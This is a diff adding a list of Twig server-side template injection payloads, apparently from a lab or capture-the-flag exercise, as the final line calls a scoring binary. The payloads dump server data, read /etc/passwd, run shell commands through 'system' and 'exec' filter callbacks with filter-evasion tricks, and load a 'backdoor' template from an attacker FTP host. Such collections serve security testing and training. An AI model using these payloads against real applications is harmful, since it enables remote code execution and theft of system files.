@@ -1,0 +1,15 @@
+{{_self}} #(Ref. to current application)
+{{_self.env}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+
+
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("/usr/local/bin/score 52722ce1-71a0-4450-8824-3801c9c5d3a5")}}
